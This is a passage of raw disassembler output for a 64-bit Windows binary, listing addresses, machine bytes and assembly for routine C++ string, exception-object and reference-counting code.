   1400016de:	c3                   	ret
   1400016df:	cc                   	int3
   1400016e0:	48 8b 42 08          	mov    0x8(%rdx),%rax
   1400016e4:	4c 8b 48 08          	mov    0x8(%rax),%r9
   1400016e8:	4c 39 49 08          	cmp    %r9,0x8(%rcx)
   1400016ec:	75 08                	jne    0x1400016f6
   1400016ee:	44 39 02             	cmp    %r8d,(%rdx)
   1400016f1:	75 03                	jne    0x1400016f6
   1400016f3:	b0 01                	mov    $0x1,%al
   1400016f5:	c3                   	ret
   1400016f6:	32 c0                	xor    %al,%al
   1400016f8:	c3                   	ret
   1400016f9:	cc                   	int3
   1400016fa:	cc                   	int3
   1400016fb:	cc                   	int3
   1400016fc:	cc                   	int3
   1400016fd:	cc                   	int3
   1400016fe:	cc                   	int3
   1400016ff:	cc                   	int3
   140001700:	48 8d 05 79 25 04 00 	lea    0x42579(%rip),%rax        # 0x140043c80
   140001707:	89 11                	mov    %edx,(%rcx)
   140001709:	48 89 41 08          	mov    %rax,0x8(%rcx)
   14000170d:	48 8b c1             	mov    %rcx,%rax
   140001710:	c3                   	ret
   140001711:	cc                   	int3
   140001712:	cc                   	int3
   140001713:	cc                   	int3
   140001714:	cc                   	int3
   140001715:	cc                   	int3
   140001716:	cc                   	int3
   140001717:	cc                   	int3
   140001718:	cc                   	int3
   140001719:	cc                   	int3
   14000171a:	cc                   	int3
   14000171b:	cc                   	int3
   14000171c:	cc                   	int3
   14000171d:	cc                   	int3
   14000171e:	cc                   	int3
   14000171f:	cc                   	int3
   140001720:	48 89 5c 24 20       	mov    %rbx,0x20(%rsp)
   140001725:	55                   	push   %rbp
   140001726:	56                   	push   %rsi
   140001727:	57                   	push   %rdi
   140001728:	48 83 ec 60          	sub    $0x60,%rsp
   14000172c:	48 8b 05 0d 19 04 00 	mov    0x4190d(%rip),%rax        # 0x140043040
   140001733:	48 33 c4             	xor    %rsp,%rax
   140001736:	48 89 44 24 50       	mov    %rax,0x50(%rsp)
   14000173b:	49 8b d8             	mov    %r8,%rbx
   14000173e:	48 8b f2             	mov    %rdx,%rsi
   140001741:	48 8b f9             	mov    %rcx,%rdi
   140001744:	48 89 4c 24 48       	mov    %rcx,0x48(%rsp)
   140001749:	48 89 5c 24 48       	mov    %rbx,0x48(%rsp)
   14000174e:	33 ed                	xor    %ebp,%ebp
   140001750:	49 39 68 10          	cmp    %rbp,0x10(%r8)
   140001754:	74 15                	je     0x14000176b
   140001756:	41 b8 02 00 00 00    	mov    $0x2,%r8d
   14000175c:	48 8d 15 e5 9c 03 00 	lea    0x39ce5(%rip),%rdx        # 0x14003b448
   140001763:	48 8b cb             	mov    %rbx,%rcx
   140001766:	e8 a5 54 00 00       	call   0x140006c10
   14000176b:	48 8b 4e 08          	mov    0x8(%rsi),%rcx
   14000176f:	48 8b 01             	mov    (%rcx),%rax
   140001772:	44 8b 06             	mov    (%rsi),%r8d
   140001775:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   14000177a:	ff 50 10             	call   *0x10(%rax)
   14000177d:	90                   	nop
   14000177e:	48 8d 54 24 28       	lea    0x28(%rsp),%rdx
   140001783:	48 83 7c 24 40 0f    	cmpq   $0xf,0x40(%rsp)
   140001789:	48 0f 47 54 24 28    	cmova  0x28(%rsp),%rdx
   14000178f:	4c 8b 44 24 38       	mov    0x38(%rsp),%r8
   140001794:	48 8b cb             	mov    %rbx,%rcx
   140001797:	e8 74 54 00 00       	call   0x140006c10
   14000179c:	90                   	nop
   14000179d:	48 8b 54 24 40       	mov    0x40(%rsp),%rdx
   1400017a2:	48 83 fa 0f          	cmp    $0xf,%rdx
   1400017a6:	76 32                	jbe    0x1400017da
   1400017a8:	48 ff c2             	inc    %rdx
   1400017ab:	48 8b 4c 24 28       	mov    0x28(%rsp),%rcx
   1400017b0:	48 8b c1             	mov    %rcx,%rax
   1400017b3:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   1400017ba:	72 19                	jb     0x1400017d5
   1400017bc:	48 83 c2 27          	add    $0x27,%rdx
   1400017c0:	48 8b 49 f8          	mov    -0x8(%rcx),%rcx
   1400017c4:	48 2b c1             	sub    %rcx,%rax
   1400017c7:	48 83 c0 f8          	add    $0xfffffffffffffff8,%rax
   1400017cb:	48 83 f8 1f          	cmp    $0x1f,%rax
   1400017cf:	0f 87 95 00 00 00    	ja     0x14000186a
   1400017d5:	e8 46 d6 00 00       	call   0x14000ee20
   1400017da:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400017dd:	0f 11 07             	movups %xmm0,(%rdi)
   1400017e0:	48 89 6f 10          	mov    %rbp,0x10(%rdi)
   1400017e4:	48 89 6f 18          	mov    %rbp,0x18(%rdi)
   1400017e8:	0f 10 03             	movups (%rbx),%xmm0
   1400017eb:	0f 11 07             	movups %xmm0,(%rdi)
   1400017ee:	0f 10 4b 10          	movups 0x10(%rbx),%xmm1
   1400017f2:	0f 11 4f 10          	movups %xmm1,0x10(%rdi)
   1400017f6:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   1400017fa:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140001801:	00 
   140001802:	c6 03 00             	movb   $0x0,(%rbx)
   140001805:	48 8b 53 18          	mov    0x18(%rbx),%rdx
   140001809:	48 83 fa 0f          	cmp    $0xf,%rdx
   14000180d:	76 2c                	jbe    0x14000183b
   14000180f:	48 ff c2             	inc    %rdx
   140001812:	48 8b 0b             	mov    (%rbx),%rcx
   140001815:	48 81 fa 00 10 00 00 	cmp    $0x1000,%rdx
   14000181c:	72 18                	jb     0x140001836
   14000181e:	48 83 c2 27          	add    $0x27,%rdx
   140001822:	4c 8b 41 f8          	mov    -0x8(%rcx),%r8
   140001826:	49 2b c8             	sub    %r8,%rcx
   140001829:	48 8d 41 f8          	lea    -0x8(%rcx),%rax
   14000182d:	48 83 f8 1f          	cmp    $0x1f,%rax
   140001831:	77 3d                	ja     0x140001870
   140001833:	49 8b c8             	mov    %r8,%rcx
   140001836:	e8 e5 d5 00 00       	call   0x14000ee20
   14000183b:	48 89 6b 10          	mov    %rbp,0x10(%rbx)
   14000183f:	48 c7 43 18 0f 00 00 	movq   $0xf,0x18(%rbx)
   140001846:	00 
   140001847:	c6 03 00             	movb   $0x0,(%rbx)
   14000184a:	48 8b c7             	mov    %rdi,%rax
   14000184d:	48 8b 4c 24 50       	mov    0x50(%rsp),%rcx
   140001852:	48 33 cc             	xor    %rsp,%rcx
   140001855:	e8 a6 d5 00 00       	call   0x14000ee00
   14000185a:	48 8b 9c 24 98 00 00 	mov    0x98(%rsp),%rbx
   140001861:	00 
   140001862:	48 83 c4 60          	add    $0x60,%rsp
   140001866:	5f                   	pop    %rdi
   140001867:	5e                   	pop    %rsi
   140001868:	5d                   	pop    %rbp
   140001869:	c3                   	ret
   14000186a:	e8 25 59 01 00       	call   0x140017194
   14000186f:	90                   	nop
   140001870:	e8 1f 59 01 00       	call   0x140017194
   140001875:	cc                   	int3
   140001876:	cc                   	int3
   140001877:	cc                   	int3
   140001878:	cc                   	int3
   140001879:	cc                   	int3
   14000187a:	cc                   	int3
   14000187b:	cc                   	int3
   14000187c:	cc                   	int3
   14000187d:	cc                   	int3
   14000187e:	cc                   	int3
   14000187f:	cc                   	int3
   140001880:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001885:	57                   	push   %rdi
   140001886:	48 83 ec 20          	sub    $0x20,%rsp
   14000188a:	48 8d 05 f7 eb 02 00 	lea    0x2ebf7(%rip),%rax        # 0x140030488
   140001891:	48 8b f9             	mov    %rcx,%rdi
   140001894:	48 89 01             	mov    %rax,(%rcx)
   140001897:	8b da                	mov    %edx,%ebx
   140001899:	48 83 c1 08          	add    $0x8,%rcx
   14000189d:	e8 6a f2 00 00       	call   0x140010b0c
   1400018a2:	f6 c3 01             	test   $0x1,%bl
   1400018a5:	74 0d                	je     0x1400018b4
   1400018a7:	ba 28 00 00 00       	mov    $0x28,%edx
   1400018ac:	48 8b cf             	mov    %rdi,%rcx
   1400018af:	e8 6c d5 00 00       	call   0x14000ee20
   1400018b4:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   1400018b9:	48 8b c7             	mov    %rdi,%rax
   1400018bc:	48 83 c4 20          	add    $0x20,%rsp
   1400018c0:	5f                   	pop    %rdi
   1400018c1:	c3                   	ret
   1400018c2:	cc                   	int3
   1400018c3:	cc                   	int3
   1400018c4:	cc                   	int3
   1400018c5:	cc                   	int3
   1400018c6:	cc                   	int3
   1400018c7:	cc                   	int3
   1400018c8:	cc                   	int3
   1400018c9:	cc                   	int3
   1400018ca:	cc                   	int3
   1400018cb:	cc                   	int3
   1400018cc:	cc                   	int3
   1400018cd:	cc                   	int3
   1400018ce:	cc                   	int3
   1400018cf:	cc                   	int3
   1400018d0:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   1400018d5:	57                   	push   %rdi
   1400018d6:	48 83 ec 20          	sub    $0x20,%rsp
   1400018da:	48 8b da             	mov    %rdx,%rbx
   1400018dd:	48 8d 05 a4 eb 02 00 	lea    0x2eba4(%rip),%rax        # 0x140030488
   1400018e4:	48 89 01             	mov    %rax,(%rcx)
   1400018e7:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   1400018eb:	48 8b f9             	mov    %rcx,%rdi
   1400018ee:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400018f1:	0f 11 02             	movups %xmm0,(%rdx)
   1400018f4:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   1400018f8:	e8 7f f1 00 00       	call   0x140010a7c
   1400018fd:	48 8d 05 84 ec 02 00 	lea    0x2ec84(%rip),%rax        # 0x140030588
   140001904:	48 89 07             	mov    %rax,(%rdi)
   140001907:	48 8d 05 92 ec 02 00 	lea    0x2ec92(%rip),%rax        # 0x1400305a0
   14000190e:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   140001912:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001917:	48 89 07             	mov    %rax,(%rdi)
   14000191a:	48 8b c7             	mov    %rdi,%rax
   14000191d:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001921:	48 83 c4 20          	add    $0x20,%rsp
   140001925:	5f                   	pop    %rdi
   140001926:	c3                   	ret
   140001927:	cc                   	int3
   140001928:	cc                   	int3
   140001929:	cc                   	int3
   14000192a:	cc                   	int3
   14000192b:	cc                   	int3
   14000192c:	cc                   	int3
   14000192d:	cc                   	int3
   14000192e:	cc                   	int3
   14000192f:	cc                   	int3
   140001930:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001935:	57                   	push   %rdi
   140001936:	48 83 ec 20          	sub    $0x20,%rsp
   14000193a:	48 8b da             	mov    %rdx,%rbx
   14000193d:	48 8d 05 44 eb 02 00 	lea    0x2eb44(%rip),%rax        # 0x140030488
   140001944:	48 89 01             	mov    %rax,(%rcx)
   140001947:	48 8d 51 08          	lea    0x8(%rcx),%rdx
   14000194b:	48 8b f9             	mov    %rcx,%rdi
   14000194e:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001951:	0f 11 02             	movups %xmm0,(%rdx)
   140001954:	48 8d 4b 08          	lea    0x8(%rbx),%rcx
   140001958:	e8 1f f1 00 00       	call   0x140010a7c
   14000195d:	48 8d 05 24 ec 02 00 	lea    0x2ec24(%rip),%rax        # 0x140030588
   140001964:	48 89 07             	mov    %rax,(%rdi)
   140001967:	48 8b c7             	mov    %rdi,%rax
   14000196a:	0f 10 43 18          	movups 0x18(%rbx),%xmm0
   14000196e:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001973:	0f 11 47 18          	movups %xmm0,0x18(%rdi)
   140001977:	48 83 c4 20          	add    $0x20,%rsp
   14000197b:	5f                   	pop    %rdi
   14000197c:	c3                   	ret
   14000197d:	cc                   	int3
   14000197e:	cc                   	int3
   14000197f:	cc                   	int3
   140001980:	48 8d 05 c9 9a 03 00 	lea    0x39ac9(%rip),%rax        # 0x14003b450
   140001987:	c3                   	ret
   140001988:	cc                   	int3
   140001989:	cc                   	int3
   14000198a:	cc                   	int3
   14000198b:	cc                   	int3
   14000198c:	cc                   	int3
   14000198d:	cc                   	int3
   14000198e:	cc                   	int3
   14000198f:	cc                   	int3
   140001990:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001995:	57                   	push   %rdi
   140001996:	48 83 ec 30          	sub    $0x30,%rsp
   14000199a:	33 ff                	xor    %edi,%edi
   14000199c:	48 8b da             	mov    %rdx,%rbx
   14000199f:	41 83 f8 01          	cmp    $0x1,%r8d
   1400019a3:	75 1d                	jne    0x1400019c2
   1400019a5:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400019a8:	41 b8 15 00 00 00    	mov    $0x15,%r8d
   1400019ae:	0f 11 02             	movups %xmm0,(%rdx)
   1400019b1:	48 89 7a 10          	mov    %rdi,0x10(%rdx)
   1400019b5:	48 89 7a 18          	mov    %rdi,0x18(%rdx)
   1400019b9:	48 8d 15 a8 ae 03 00 	lea    0x3aea8(%rip),%rdx        # 0x14003c868
   1400019c0:	eb 2a                	jmp    0x1400019ec
   1400019c2:	41 8b c8             	mov    %r8d,%ecx
   1400019c5:	e8 0a c9 00 00       	call   0x14000e2d4
   1400019ca:	0f 57 c0             	xorps  %xmm0,%xmm0
   1400019cd:	49 c7 c0 ff ff ff ff 	mov    $0xffffffffffffffff,%r8
   1400019d4:	0f 11 03             	movups %xmm0,(%rbx)
   1400019d7:	48 89 7b 10          	mov    %rdi,0x10(%rbx)
   1400019db:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   1400019df:	90                   	nop
   1400019e0:	49 ff c0             	inc    %r8
   1400019e3:	42 38 3c 00          	cmp    %dil,(%rax,%r8,1)
   1400019e7:	75 f7                	jne    0x1400019e0
   1400019e9:	48 8b d0             	mov    %rax,%rdx
   1400019ec:	48 8b cb             	mov    %rbx,%rcx
   1400019ef:	e8 5c 72 00 00       	call   0x140008c50
   1400019f4:	48 8b c3             	mov    %rbx,%rax
   1400019f7:	48 8b 5c 24 40       	mov    0x40(%rsp),%rbx
   1400019fc:	48 83 c4 30          	add    $0x30,%rsp
   140001a00:	5f                   	pop    %rdi
   140001a01:	c3                   	ret
   140001a02:	cc                   	int3
   140001a03:	cc                   	int3
   140001a04:	cc                   	int3
   140001a05:	cc                   	int3
   140001a06:	cc                   	int3
   140001a07:	cc                   	int3
   140001a08:	cc                   	int3
   140001a09:	cc                   	int3
   140001a0a:	cc                   	int3
   140001a0b:	cc                   	int3
   140001a0c:	cc                   	int3
   140001a0d:	cc                   	int3
   140001a0e:	cc                   	int3
   140001a0f:	cc                   	int3
   140001a10:	40 53                	rex push %rbx
   140001a12:	48 83 ec 20          	sub    $0x20,%rsp
   140001a16:	48 8b d9             	mov    %rcx,%rbx
   140001a19:	f6 c2 01             	test   $0x1,%dl
   140001a1c:	74 0a                	je     0x140001a28
   140001a1e:	ba 10 00 00 00       	mov    $0x10,%edx
   140001a23:	e8 f8 d3 00 00       	call   0x14000ee20
   140001a28:	48 8b c3             	mov    %rbx,%rax
   140001a2b:	48 83 c4 20          	add    $0x20,%rsp
   140001a2f:	5b                   	pop    %rbx
   140001a30:	c3                   	ret
   140001a31:	cc                   	int3
   140001a32:	cc                   	int3
   140001a33:	cc                   	int3
   140001a34:	cc                   	int3
   140001a35:	cc                   	int3
   140001a36:	cc                   	int3
   140001a37:	cc                   	int3
   140001a38:	cc                   	int3
   140001a39:	cc                   	int3
   140001a3a:	cc                   	int3
   140001a3b:	cc                   	int3
   140001a3c:	cc                   	int3
   140001a3d:	cc                   	int3
   140001a3e:	cc                   	int3
   140001a3f:	cc                   	int3
   140001a40:	48 8d 05 19 9a 03 00 	lea    0x39a19(%rip),%rax        # 0x14003b460
   140001a47:	48 c7 41 10 00 00 00 	movq   $0x0,0x10(%rcx)
   140001a4e:	00 
   140001a4f:	48 89 41 08          	mov    %rax,0x8(%rcx)
   140001a53:	48 8d 05 96 eb 02 00 	lea    0x2eb96(%rip),%rax        # 0x1400305f0
   140001a5a:	48 89 01             	mov    %rax,(%rcx)
   140001a5d:	48 8b c1             	mov    %rcx,%rax
   140001a60:	c3                   	ret
   140001a61:	cc                   	int3
   140001a62:	cc                   	int3
   140001a63:	cc                   	int3
   140001a64:	cc                   	int3
   140001a65:	cc                   	int3
   140001a66:	cc                   	int3
   140001a67:	cc                   	int3
   140001a68:	cc                   	int3
   140001a69:	cc                   	int3
   140001a6a:	cc                   	int3
   140001a6b:	cc                   	int3
   140001a6c:	cc                   	int3
   140001a6d:	cc                   	int3
   140001a6e:	cc                   	int3
   140001a6f:	cc                   	int3
   140001a70:	48 83 ec 48          	sub    $0x48,%rsp
   140001a74:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001a79:	e8 c2 ff ff ff       	call   0x140001a40
   140001a7e:	48 8d 15 ab fc 03 00 	lea    0x3fcab(%rip),%rdx        # 0x140041730
   140001a85:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001a8a:	e8 31 f2 00 00       	call   0x140010cc0
   140001a8f:	cc                   	int3
   140001a90:	40 53                	rex push %rbx
   140001a92:	48 83 ec 20          	sub    $0x20,%rsp
   140001a96:	48 8b d9             	mov    %rcx,%rbx
   140001a99:	48 8b c2             	mov    %rdx,%rax
   140001a9c:	48 8d 0d e5 e9 02 00 	lea    0x2e9e5(%rip),%rcx        # 0x140030488
   140001aa3:	0f 57 c0             	xorps  %xmm0,%xmm0
   140001aa6:	48 8d 53 08          	lea    0x8(%rbx),%rdx
   140001aaa:	48 89 0b             	mov    %rcx,(%rbx)
   140001aad:	48 8d 48 08          	lea    0x8(%rax),%rcx
   140001ab1:	0f 11 02             	movups %xmm0,(%rdx)
   140001ab4:	e8 c3 ef 00 00       	call   0x140010a7c
   140001ab9:	48 8d 05 30 eb 02 00 	lea    0x2eb30(%rip),%rax        # 0x1400305f0
   140001ac0:	48 89 03             	mov    %rax,(%rbx)
   140001ac3:	48 8b c3             	mov    %rbx,%rax
   140001ac6:	48 83 c4 20          	add    $0x20,%rsp
   140001aca:	5b                   	pop    %rbx
   140001acb:	c3                   	ret
   140001acc:	cc                   	int3
   140001acd:	cc                   	int3
   140001ace:	cc                   	int3
   140001acf:	cc                   	int3
   140001ad0:	40 53                	rex push %rbx
   140001ad2:	48 83 ec 20          	sub    $0x20,%rsp
   140001ad6:	48 8d 05 2b eb 02 00 	lea    0x2eb2b(%rip),%rax        # 0x140030608
   140001add:	48 8b d9             	mov    %rcx,%rbx
   140001ae0:	48 89 01             	mov    %rax,(%rcx)
   140001ae3:	f6 c2 01             	test   $0x1,%dl
   140001ae6:	74 0a                	je     0x140001af2
   140001ae8:	ba 08 00 00 00       	mov    $0x8,%edx
   140001aed:	e8 2e d3 00 00       	call   0x14000ee20
   140001af2:	48 8b c3             	mov    %rbx,%rax
   140001af5:	48 83 c4 20          	add    $0x20,%rsp
   140001af9:	5b                   	pop    %rbx
   140001afa:	c3                   	ret
   140001afb:	cc                   	int3
   140001afc:	cc                   	int3
   140001afd:	cc                   	int3
   140001afe:	cc                   	int3
   140001aff:	cc                   	int3
   140001b00:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001b05:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140001b0a:	57                   	push   %rdi
   140001b0b:	48 83 ec 20          	sub    $0x20,%rsp
   140001b0f:	48 8b fa             	mov    %rdx,%rdi
   140001b12:	48 8b d9             	mov    %rcx,%rbx
   140001b15:	33 d2                	xor    %edx,%edx
   140001b17:	e8 e0 90 00 00       	call   0x14000abfc
   140001b1c:	90                   	nop
   140001b1d:	33 c0                	xor    %eax,%eax
   140001b1f:	48 89 43 08          	mov    %rax,0x8(%rbx)
   140001b23:	88 43 10             	mov    %al,0x10(%rbx)
   140001b26:	48 89 43 18          	mov    %rax,0x18(%rbx)
   140001b2a:	88 43 20             	mov    %al,0x20(%rbx)
   140001b2d:	48 89 43 28          	mov    %rax,0x28(%rbx)
   140001b31:	66 89 43 30          	mov    %ax,0x30(%rbx)
   140001b35:	48 89 43 38          	mov    %rax,0x38(%rbx)
   140001b39:	66 89 43 40          	mov    %ax,0x40(%rbx)
   140001b3d:	48 89 43 48          	mov    %rax,0x48(%rbx)
   140001b41:	88 43 50             	mov    %al,0x50(%rbx)
   140001b44:	48 89 43 58          	mov    %rax,0x58(%rbx)
   140001b48:	88 43 60             	mov    %al,0x60(%rbx)
   140001b4b:	48 85 ff             	test   %rdi,%rdi
   140001b4e:	74 1a                	je     0x140001b6a
   140001b50:	48 8b d7             	mov    %rdi,%rdx
   140001b53:	48 8b cb             	mov    %rbx,%rcx
   140001b56:	e8 25 b0 00 00       	call   0x14000cb80
   140001b5b:	90                   	nop
   140001b5c:	48 8b c3             	mov    %rbx,%rax
   140001b5f:	48 8b 5c 24 38       	mov    0x38(%rsp),%rbx
   140001b64:	48 83 c4 20          	add    $0x20,%rsp
   140001b68:	5f                   	pop    %rdi
   140001b69:	c3                   	ret
   140001b6a:	48 8d 0d ff 98 03 00 	lea    0x398ff(%rip),%rcx        # 0x14003b470
   140001b71:	e8 7e 93 00 00       	call   0x14000aef4
   140001b76:	cc                   	int3
   140001b77:	cc                   	int3
   140001b78:	cc                   	int3
   140001b79:	cc                   	int3
   140001b7a:	cc                   	int3
   140001b7b:	cc                   	int3
   140001b7c:	cc                   	int3
   140001b7d:	cc                   	int3
   140001b7e:	cc                   	int3
   140001b7f:	cc                   	int3
   140001b80:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140001b85:	57                   	push   %rdi
   140001b86:	48 83 ec 20          	sub    $0x20,%rsp
   140001b8a:	48 8b d9             	mov    %rcx,%rbx
   140001b8d:	e8 5a b0 00 00       	call   0x14000cbec
   140001b92:	48 8b 4b 58          	mov    0x58(%rbx),%rcx
   140001b96:	48 85 c9             	test   %rcx,%rcx
   140001b99:	74 05                	je     0x140001ba0
   140001b9b:	e8 44 51 01 00       	call   0x140016ce4
   140001ba0:	33 ff                	xor    %edi,%edi
   140001ba2:	48 89 7b 58          	mov    %rdi,0x58(%rbx)
   140001ba6:	48 8b 4b 48          	mov    0x48(%rbx),%rcx
   140001baa:	48 85 c9             	test   %rcx,%rcx
   140001bad:	74 05                	je     0x140001bb4
   140001baf:	e8 30 51 01 00       	call   0x140016ce4
   140001bb4:	48 89 7b 48          	mov    %rdi,0x48(%rbx)
   140001bb8:	48 8b 4b 38          	mov    0x38(%rbx),%rcx
   140001bbc:	48 85 c9             	test   %rcx,%rcx
   140001bbf:	74 05                	je     0x140001bc6
   140001bc1:	e8 1e 51 01 00       	call   0x140016ce4
   140001bc6:	48 89 7b 38          	mov    %rdi,0x38(%rbx)
   140001bca:	48 8b 4b 28          	mov    0x28(%rbx),%rcx
   140001bce:	48 85 c9             	test   %rcx,%rcx
   140001bd1:	74 05                	je     0x140001bd8
   140001bd3:	e8 0c 51 01 00       	call   0x140016ce4
   140001bd8:	48 89 7b 28          	mov    %rdi,0x28(%rbx)
   140001bdc:	48 8b 4b 18          	mov    0x18(%rbx),%rcx
   140001be0:	48 85 c9             	test   %rcx,%rcx
   140001be3:	74 05                	je     0x140001bea
   140001be5:	e8 fa 50 01 00       	call   0x140016ce4
   140001bea:	48 89 7b 18          	mov    %rdi,0x18(%rbx)
   140001bee:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001bf2:	48 85 c9             	test   %rcx,%rcx
   140001bf5:	74 05                	je     0x140001bfc
   140001bf7:	e8 e8 50 01 00       	call   0x140016ce4
   140001bfc:	48 89 7b 08          	mov    %rdi,0x8(%rbx)
   140001c00:	48 8b cb             	mov    %rbx,%rcx
   140001c03:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   140001c08:	48 83 c4 20          	add    $0x20,%rsp
   140001c0c:	5f                   	pop    %rdi
   140001c0d:	e9 62 90 00 00       	jmp    0x14000ac74
   140001c12:	cc                   	int3
   140001c13:	cc                   	int3
   140001c14:	cc                   	int3
   140001c15:	cc                   	int3
   140001c16:	cc                   	int3
   140001c17:	cc                   	int3
   140001c18:	cc                   	int3
   140001c19:	cc                   	int3
   140001c1a:	cc                   	int3
   140001c1b:	cc                   	int3
   140001c1c:	cc                   	int3
   140001c1d:	cc                   	int3
   140001c1e:	cc                   	int3
   140001c1f:	cc                   	int3
   140001c20:	f0 ff 41 08          	lock incl 0x8(%rcx)
   140001c24:	c3                   	ret
   140001c25:	cc                   	int3
   140001c26:	cc                   	int3
   140001c27:	cc                   	int3
   140001c28:	cc                   	int3
   140001c29:	cc                   	int3
   140001c2a:	cc                   	int3
   140001c2b:	cc                   	int3
   140001c2c:	cc                   	int3
   140001c2d:	cc                   	int3
   140001c2e:	cc                   	int3
   140001c2f:	cc                   	int3
   140001c30:	f0 83 41 08 ff       	lock addl $0xffffffff,0x8(%rcx)
   140001c35:	b8 00 00 00 00       	mov    $0x0,%eax
   140001c3a:	48 0f 44 c1          	cmove  %rcx,%rax
   140001c3e:	c3                   	ret
   140001c3f:	cc                   	int3
   140001c40:	48 8d 05 c1 e9 02 00 	lea    0x2e9c1(%rip),%rax        # 0x140030608
   140001c47:	48 89 01             	mov    %rax,(%rcx)
   140001c4a:	c3                   	ret
   140001c4b:	cc                   	int3
   140001c4c:	cc                   	int3
   140001c4d:	cc                   	int3
   140001c4e:	cc                   	int3
   140001c4f:	cc                   	int3
   140001c50:	48 83 ec 28          	sub    $0x28,%rsp
   140001c54:	48 8b 49 08          	mov    0x8(%rcx),%rcx
   140001c58:	48 85 c9             	test   %rcx,%rcx
   140001c5b:	74 1d                	je     0x140001c7a
   140001c5d:	48 8b 01             	mov    (%rcx),%rax
   140001c60:	ff 50 10             	call   *0x10(%rax)
   140001c63:	48 85 c0             	test   %rax,%rax
   140001c66:	74 12                	je     0x140001c7a
   140001c68:	4c 8b 00             	mov    (%rax),%r8
   140001c6b:	ba 01 00 00 00       	mov    $0x1,%edx
   140001c70:	48 8b c8             	mov    %rax,%rcx
   140001c73:	48 83 c4 28          	add    $0x28,%rsp
   140001c77:	49 ff 20             	rex.WB jmp *(%r8)
   140001c7a:	48 83 c4 28          	add    $0x28,%rsp
   140001c7e:	c3                   	ret
   140001c7f:	cc                   	int3
   140001c80:	48 89 5c 24 10       	mov    %rbx,0x10(%rsp)
   140001c85:	48 89 74 24 18       	mov    %rsi,0x18(%rsp)
   140001c8a:	55                   	push   %rbp
   140001c8b:	57                   	push   %rdi
   140001c8c:	41 56                	push   %r14
   140001c8e:	48 8d 6c 24 b9       	lea    -0x47(%rsp),%rbp
   140001c93:	48 81 ec b0 00 00 00 	sub    $0xb0,%rsp
   140001c9a:	48 8b da             	mov    %rdx,%rbx
   140001c9d:	48 8b f9             	mov    %rcx,%rdi
   140001ca0:	45 33 f6             	xor    %r14d,%r14d
   140001ca3:	48 85 c9             	test   %rcx,%rcx
   140001ca6:	0f 84 35 01 00 00    	je     0x140001de1
   140001cac:	4c 39 31             	cmp    %r14,(%rcx)
   140001caf:	0f 85 2c 01 00 00    	jne    0x140001de1
   140001cb5:	b9 30 00 00 00       	mov    $0x30,%ecx
   140001cba:	e8 69 d1 00 00       	call   0x14000ee28
   140001cbf:	48 8b f0             	mov    %rax,%rsi
   140001cc2:	48 89 45 67          	mov    %rax,0x67(%rbp)
   140001cc6:	48 8b 4b 08          	mov    0x8(%rbx),%rcx
   140001cca:	48 85 c9             	test   %rcx,%rcx
   140001ccd:	74 0f                	je     0x140001cde
   140001ccf:	48 8b 59 28          	mov    0x28(%rcx),%rbx
   140001cd3:	48 85 db             	test   %rbx,%rbx
   140001cd6:	75 0d                	jne    0x140001ce5
   140001cd8:	48 8d 59 30          	lea    0x30(%rcx),%rbx
   140001cdc:	eb 07                	jmp    0x140001ce5
   140001cde:	48 8d 1d a8 97 03 00 	lea    0x397a8(%rip),%rbx        # 0x14003b48d
   140001ce5:	33 d2                	xor    %edx,%edx
   140001ce7:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001ceb:	e8 0c 8f 00 00       	call   0x14000abfc
   140001cf0:	90                   	nop
   140001cf1:	4c 89 75 bf          	mov    %r14,-0x41(%rbp)
   140001cf5:	c6 45 c7 00          	movb   $0x0,-0x39(%rbp)
   140001cf9:	4c 89 75 cf          	mov    %r14,-0x31(%rbp)
   140001cfd:	c6 45 d7 00          	movb   $0x0,-0x29(%rbp)
   140001d01:	4c 89 75 df          	mov    %r14,-0x21(%rbp)
   140001d05:	66 44 89 75 e7       	mov    %r14w,-0x19(%rbp)
   140001d0a:	4c 89 75 ef          	mov    %r14,-0x11(%rbp)
   140001d0e:	66 44 89 75 f7       	mov    %r14w,-0x9(%rbp)
   140001d13:	4c 89 75 ff          	mov    %r14,-0x1(%rbp)
   140001d17:	c6 45 07 00          	movb   $0x0,0x7(%rbp)
   140001d1b:	4c 89 75 0f          	mov    %r14,0xf(%rbp)
   140001d1f:	c6 45 17 00          	movb   $0x0,0x17(%rbp)
   140001d23:	48 85 db             	test   %rbx,%rbx
   140001d26:	0f 84 d2 00 00 00    	je     0x140001dfe
   140001d2c:	48 8b d3             	mov    %rbx,%rdx
   140001d2f:	48 8d 4d b7          	lea    -0x49(%rbp),%rcx
   140001d33:	e8 48 ae 00 00       	call   0x14000cb80
   140001d38:	90                   	nop
   140001d39:	44 89 76 08          	mov    %r14d,0x8(%rsi)
   140001d3d:	48 8d 05 e4 e8 02 00 	lea    0x2e8e4(%rip),%rax        # 0x140030628
   140001d44:	48 89 06             	mov    %rax,(%rsi)
   140001d47:	48 8d 4d 1f          	lea    0x1f(%rbp),%rcx
   140001d4b:	e8 7c c6 00 00       	call   0x14000e3cc
   140001d50:	0f 10 00             	movups (%rax),%xmm0
